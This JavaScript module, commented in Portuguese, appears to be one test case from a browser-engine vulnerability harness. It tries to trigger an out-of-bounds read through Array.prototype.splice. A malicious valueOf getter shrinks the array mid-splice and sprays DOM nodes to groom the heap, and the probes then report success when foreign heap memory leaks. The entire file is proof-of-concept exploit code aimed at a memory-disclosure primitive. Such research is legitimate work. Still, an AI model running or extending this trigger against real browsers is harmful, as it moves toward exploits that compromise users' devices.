import { Groomer } from '../mod_groomer.js';

export default {
    id:       'ARRAY_BUTTERFLY_SPLICE_OOB',
    category: 'CoreJS',
    risk:     'CRITICAL',
    description:
        'Mutação do JSArray Butterfly durante a execução do C++ Array.prototype.splice. ' +
        'O tamanho do array é reduzido a zero dentro de um getter maligno (valueOf) ' +
        'enquanto o motor C++ está a mover os elementos. Resulta em Out-Of-Bounds (OOB). ' +
        'O valor lido é capturado imediatamente no trigger para evitar que o GC ' +
        'invalide o butterfly stale antes do probe.',

    setup: function() {
        this.results = {};

        // Array de doubles com SENTINEL único no índice 10.
        // 9999.0001 não ocorre naturalmente na heap — distingue:
        //   (a) butterfly stale (leu o próprio dado)
        //   (b) lixo externo (leu memória alheia)
        this.vulnArray = [];
        for (let i = 0; i < 20; i++) {
            this.vulnArray.push(1.111111 + i);
        }
        this.vulnArray[10] = 9999.0001;

        const self = this;
        this.evilObject = {
            valueOf: function() {
                // Dispara dentro do splice C++ — zera o array
                self.vulnArray.length = 0;
                // Pressão no heap para perturbar o layout
                let trash = Groomer.sprayDOM('div', 1000);
                return 9.999999;
            }
        };
    },

    trigger: function() {
        try {
            this.vulnArray.splice(5, 1, this.evilObject);
        } catch(e) {
            this.results.error = e.message;
        }

        // CAPTURA IMEDIATA — antes de qualquer GC ou reuse do butterfly.
        // Se esperarmos até ao probe, o GC pode ter zerado/reutilizado a memória.
        this.results.oobVal  = this.vulnArray[10];
        this.results.oobLen  = this.vulnArray.length;
        this.results.oobType = typeof this.vulnArray[10];
    },

    probe: [
        // Probe 0: Tamanho final do array visto pelo motor C++
        s => s.results.oobLen,

        // Probe 1: Tipo do valor no índice 10
        s => s.results.oobType,

        // Probe 2: Classificador de resultado baseado na captura imediata
        s => {
            if (s.results.error) {
                return `Erro no trigger: ${s.results.error}`;
            }

            let val = s.results.oobVal;

            if (typeof val === 'undefined') {
                return 'Protegido / Array Vazio (bounds check funcionou)';
            }

            if (typeof val === 'number' && !isNaN(val)) {
                if (Math.abs(val - 9999.0001) < 0.0001) {
                    // Leu o próprio butterfly stale — OOB real mas dados controlados
                    return `⚠️ OOB Confirmado (Butterfly Stale): ${val} — acesso fora dos limites, dados próprios`;
                }
                // Leu memória alheia — primitiva de leak mais forte
                return `💥 SUCESSO! OOB Externo (Lixo da RAM): ${val}`;
            }

            return `Inesperado: ${JSON.stringify(val)}`;
        }
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.evilObject = null;
        this.results = {};
    }
};

